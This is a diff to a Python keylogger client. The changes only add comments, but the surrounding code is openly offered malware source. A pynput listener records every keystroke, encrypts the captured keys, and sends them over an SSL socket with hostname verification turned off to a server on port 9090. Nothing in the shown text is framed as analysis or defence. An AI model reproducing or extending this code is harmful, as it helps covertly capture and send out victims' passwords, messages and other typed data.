@@ -5,6 +5,7 @@ import socket
 import threading
 import time
 
+#server address and port
 SERVER = ''
 PORT = 9090
 listener_active = False
@@ -20,6 +21,7 @@ def encryption_message(key, message):
     encrypted_message = f.encrypt(message.encode())
     return encrypted_message
 
+# create and return an SSL wrapped socket connection
 def create_ssl_connection(server, port):
     context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
     context.check_hostname = False
@@ -34,6 +36,7 @@ def create_ssl_connection(server, port):
         return None
 
 # SOCKETS
+#send encrypted keystrokes to server
 def send_keystrokes(key, keystrokes_data):
     global listener_active
     print("5")
@@ -56,13 +59,13 @@ def send_keystrokes(key, keystrokes_data):
         s.sendall(encrypted_message)
         print('Keystrokes sent Successfully')
 
-# Keylogger key
+# captures key strokes
 def on_press(key):
     global keystrokes
     keystrokes.append(str(key))
     print((str(key)))
 
-# Keylogger
+# threads function to start the keylogger listener
 def keyboard_listener():
     print("s1")
     with Listener(on_press=on_press) as listener:
@@ -70,6 +73,7 @@ def keyboard_listener():
         listener.join()
         print("s3")
 
+#initialize and start the keylogger thread
 def start_listener():
     print("k1")
     global listener_active
@@ -88,6 +92,7 @@ def main():
     start_listener()
     while True:
         try:
+            #loop the key logger and send encrypted messages periodically
             print(listener_active)
             if listener_active:
                 print("1")
